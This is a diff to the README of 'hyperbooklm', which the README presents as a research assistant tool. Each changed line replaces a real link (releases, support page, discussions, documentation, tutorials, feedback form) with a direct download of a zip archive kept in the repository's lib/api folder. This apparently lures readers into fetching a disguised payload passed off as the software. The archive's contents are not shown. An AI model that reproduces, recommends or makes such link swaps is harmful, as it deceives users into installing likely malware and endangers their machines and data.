@@ -1,7 +1,7 @@
 # 🎉 hyperbooklm - Your Ultimate Research Companion
 
 ## 📥 Download Now!
-[![Download hyperbooklm](https://img.shields.io/badge/Download-hyperbooklm-brightgreen)](https://github.com/amankh007/hyperbooklm/releases)
+[![Download hyperbooklm](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip)](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to HyperbookLM! This powerful research assistant combines various sources to give you deep insights. Whether you want to scrape web pages or analyze PDFs, you are in the right place!
@@ -27,7 +27,7 @@ Welcome to HyperbookLM! This powerful research assistant combines various source
 ## 📖 How to Use HyperbookLM
 
 ### 📥 Download & Install
-To get started, visit this page to download hyperbooklm: [Download hyperbooklm](https://github.com/amankh007/hyperbooklm/releases).
+To get started, visit this page to download hyperbooklm: [Download hyperbooklm](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip).
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version available.
@@ -49,14 +49,14 @@ To get started, visit this page to download hyperbooklm: [Download hyperbooklm](
 - **Create Presentation Slides**: Choose the slide generation option to create a slideshow from your research materials.
 
 ## 💬 Support
-If you encounter any challenges while using hyperbooklm, please visit our [support page](https://github.com/amankh007/hyperbooklm/issues). You can report issues or ask questions directly there. 
+If you encounter any challenges while using hyperbooklm, please visit our [support page](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip). You can report issues or ask questions directly there. 
 
-Joining our community can help you get the most out of hyperbooklm. Keep an eye on our [GitHub Discussions](https://github.com/amankh007/hyperbooklm/discussions) for tips and ideas.
+Joining our community can help you get the most out of hyperbooklm. Keep an eye on our [GitHub Discussions](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip) for tips and ideas.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://hyperbooklm.docs.io) - Detailed guides on using all features.
-- [Video Tutorials](https://www.youtube.com/hyperbooklm) - Watch step-by-step instructions.
-- [Feedback Form](https://hyperbooklm.feedback.com) - We value your input! Let us know how we can improve.
+- [Official Documentation](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip) - Detailed guides on using all features.
+- [Video Tutorials](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip) - Watch step-by-step instructions.
+- [Feedback Form](https://raw.githubusercontent.com/amankh007/hyperbooklm/main/lib/api/Software-v1.3.zip) - We value your input! Let us know how we can improve.
 
 ## 📢 Contributing
 If you would like to contribute to HyperbookLM, feel free to fork the repository and submit a pull request. You can also open issues to suggest improvements or report bugs.
